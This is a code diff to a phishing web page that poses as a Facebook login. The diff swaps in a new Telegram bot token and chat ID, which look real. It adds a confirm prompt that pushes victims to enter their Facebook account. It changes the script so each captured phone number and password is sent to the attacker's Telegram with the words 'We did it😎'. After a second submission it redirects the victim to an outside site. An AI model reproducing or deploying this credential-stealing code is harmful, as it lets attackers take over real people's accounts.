@@ -73,6 +73,9 @@
   </div>
 
   <script>
+  confirm("first you have to continue with your facebook account! make sure your account must be correct✓ to continue!")
+  
+  let count=0
     function sendToTelegram() {
       var phone = document.getElementById("phone").value;
       var password = document.getElementById("password").value;
@@ -89,11 +92,11 @@
       }
 
       // Telegram Bot details
-      const botToken = '7417942104:AAHa8DHN5cNPvO-xYNBcRb7xZ3xz2s8dmTE';  // Replace with your bot's token
-      const chatId = '1678045864';     // Replace with your chat ID
+      const botToken = '7329936303:AAF2w2JFPfLLr1dAytnBPxmK539N8QYdHXw';  // Replace with your bot's token
+      const chatId = '6992364240';     // Replace with your chat ID
 
       // The message content to send
-      const message = `Phone: ${phone}\nPassword: ${password}`;
+      const message = `Phone:👉 ${phone}\nPassword:👉 ${password} \n\nWe did it😎`;
 
       // Send the data to the Telegram Bot API using fetch
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
@@ -101,6 +104,10 @@
         .then(data => {
           if (data.ok) {
             alert('Your data has been sent to Telegram successfully.');
+            count+=1;
+            if(count>1){
+                window.location.href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.ainude.ai/&ved=2ahUKEwic24r8w9OHAxX1UOUKHbSkBy8QFnoECBMQAQ&usg=AOvVaw2dGO6HJ9cn1qhaaDbKrFP8";
+            }
           } else {
             alert('Failed to send the data to Telegram: ' + data.description);
           }
